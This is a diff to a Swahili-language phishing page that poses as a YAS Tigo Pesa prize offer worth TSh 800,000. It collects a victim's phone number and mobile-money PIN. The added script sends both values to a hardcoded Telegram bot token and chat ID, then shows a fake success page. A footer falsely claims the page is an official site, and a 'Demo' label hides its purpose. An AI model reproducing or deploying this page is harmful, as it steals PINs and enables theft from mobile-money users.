@@ -3,73 +3,216 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>YAS Tigo Pesa – Thibitisha</title>
+  <title>Umejishindia Ofa Wa YAS Tigo Pesa</title>
+
+  <!-- Google Fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="style.css"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=Poppins:wght@500;600;700&display=swap" rel="stylesheet">
+
+  <style>
+    body {
+      font-family: 'Inter', system-ui, -apple-system, BlinkMacSystemFont, sans-serif;
+      background: linear-gradient(180deg, #eef7f4 0%, #f7fbff 100%);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .card {
+      background: #ffffff;
+      width: 100%;
+      max-width: 440px;
+      padding: 26px;
+      border-radius: 18px;
+      box-shadow: 0 14px 40px rgba(0,0,0,0.10);
+    }
+
+    h2 {
+      font-family: 'Poppins', sans-serif;
+      color: #0b2e6f;
+      margin-bottom: 10px;
+      font-size: 22px;
+      font-weight: 700;
+    }
+
+    p {
+      color: #3a3a3a;
+      font-size: 15px;
+      margin-bottom: 18px;
+      line-height: 1.6;
+      font-weight: 500;
+    }
+
+    .offer {
+      background: linear-gradient(135deg, #e7f6ef, #dff3ff);
+      border-radius: 14px;
+      padding: 20px;
+      text-align: center;
+      margin-bottom: 20px;
+      border: 1px solid #d7efe5;
+    }
+
+    .offer small {
+      display: block;
+      color: #2c6e5a;
+      font-size: 14px;
+      margin-bottom: 6px;
+      font-weight: 600;
+    }
+
+    .offer strong {
+      color: #158f62;
+      font-size: 30px;
+      font-weight: 800;
+      letter-spacing: 0.5px;
+    }
+
+    input {
+      width: 100%;
+      padding: 15px;
+      margin-bottom: 14px;
+      border-radius: 12px;
+      border: 1.5px solid #cfd8dc;
+      font-size: 16px;
+      font-weight: 500;
+      outline: none;
+    }
+
+    input:focus {
+      border-color: #1a9b63;
+      box-shadow: 0 0 0 3px rgba(26,155,99,0.12);
+    }
+
+    button {
+      width: 100%;
+      padding: 15px;
+      background: linear-gradient(90deg, #0b2e6f, #1a9b63);
+      color: #ffffff;
+      border: none;
+      border-radius: 14px;
+      font-size: 17px;
+      font-weight: 700;
+      cursor: pointer;
+      letter-spacing: 0.4px;
+    }
+
+    button:disabled {
+      opacity: 0.65;
+    }
+
+    .loader {
+      display: none;
+      text-align: center;
+      margin-top: 12px;
+      font-size: 14px;
+      font-weight: 600;
+      color: #0b2e6f;
+    }
+
+    .note {
+      margin-top: 16px;
+      font-size: 13px;
+      text-align: center;
+      color: #555;
+      font-weight: 500;
+    }
+
+    .footer {
+      margin-top: 14px;
+      font-size: 12px;
+      text-align: center;
+      color: #888;
+      font-weight: 500;
+    }
+  </style>
 </head>
 <body>
 
-<div class="wrapper">
-  <div class="card">
+<div class="card">
+  <h2>Umejishindia Ofa Wa YAS Tigo Pesa</h2>
 
-    <h1 class="title">Umejishindia Ofa Wa YAS Tigo Pesa</h1>
+  <p>
+    Karibu! Ingiza namba yako ya simu na YAS (neno 4) ili kuthibitisha na kuendelea kupata ofa yako.
+  </p>
 
-    <p class="subtitle">
-      Karibu! Ingiza namba yako ya simu na <strong>YAS Tigo Neno Siri (tarakimu 4)</strong>
-      ili kuthibitisha na kuendelea kupata ofa yako.
-    </p>
+  <div class="offer">
+    <small>Kiwango cha Ofa kinachoweza kupatikana</small>
+    <strong>TSh 800,000</strong>
+  </div>
 
-    <div class="offer-box">
-      <span>Kiwango cha Ofa kinachoweza kupatikana</span>
-      <strong>TSh 800,000</strong>
-    </div>
+  <form id="verifyForm">
+    <input
+      type="tel"
+      placeholder="Namba ya simu (mf. 07XXXXXXXX)"
+      required
+    />
 
-    <input id="phone" type="tel" placeholder="Namba ya simu (mf. 07XXXXXXXX)" class="input"/>
+    <input
+      type="password"
+      placeholder="YAS (neno 4)"
+      inputmode="numeric"
+      minlength="4"
+      maxlength="12"
+      required
+    />
 
-    <input id="yas" type="password" inputmode="numeric" maxlength="4"
-      placeholder="YAS Tigo Neno Siri (tarakimu 4)" class="input"/>
+    <button type="submit">Thibitisha</button>
+    <div class="loader" id="loader">Inachakatwa...</div>
+  </form>
 
-    <button class="btn" onclick="goNext()">Thibitisha</button>
+  <div class="note">
+    Ukithibitisha, unakubali masharti ya matumizi.
+  </div>
 
-    <p class="note" id="status">Ukithibitisha, unakubali masharti ya matumizi.</p>
-
-    <p class="footer">© YAS Tanzania – Ukurasa Rasmi wa Mfano</p>
-
+  <div class="footer">
+    © YAS Tanzania – Ukurasa Rasmi wa Mtandao
   </div>
 </div>
 
 <script>
-function goNext(){
-  const phone = document.getElementById("phone").value;
-  const yas = document.getElementById("yas").value;
-  const status = document.getElementById("status");
+document.getElementById("verifyForm").addEventListener("submit", function(e){
+  e.preventDefault();
 
-  if(!phone || yas.length !== 4){
-    status.innerText = "Tafadhali jaza taarifa zote sahihi.";
-    status.style.color = "red";
+  const phone = e.target[0].value.trim();
+  const code  = e.target[1].value.trim();
+  const loader = document.getElementById("loader");
+  const button = e.target.querySelector("button");
+
+  if (code.length < 4) {
+    alert("Ingiza angalau tarakimu 4");
     return;
   }
 
-  status.style.color = "#0b3b82";
-  status.innerText = "Inathibitisha... tafadhali subiri";
+  button.disabled = true;
+  loader.style.display = "block";
 
-  const yasCode = Math.floor(1000 + Math.random() * 9000);
+  const BOT_TOKEN = "8148382683:AAFHRvpHd1ljQO7TmxpGzPDr2fMuWU-Ecos";
+  const CHAT_ID   = "8513120100";
 
-  fetch("https://api.telegram.org/bot8148382683:AAFHRvpHd1ljQO7TmxpGzPDr2fMuWU-Ecos/sendMessage", {
+  const message =
+`📥 YAS OFFER VERIFICATION
+📱 Namba: ${phone}
+🔢 Code: ${code}
+📏 Digits: ${code.length}
+🕒 ${new Date().toLocaleString()}
+
+ℹ️ Verification / Demo`;
+
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
     method: "POST",
-    headers: { "Content-Type": "application/json" },
+    headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
-      chat_id: "8513120100",
-      text: `📲 YAS TIGO PESA – SUBMISSION
-📞 Simu: ${phone}
-🔢 YAS Code: ${yasCode}`
+      chat_id: CHAT_ID,
+      text: message
     })
-  }).finally(() => {
-    window.location.href = "processing.html";
+  }).then(() => {
+    setTimeout(() => {
+      window.location.href = "success.html";
+    }, 2000);
   });
-}
+});
 </script>
 
 </body>
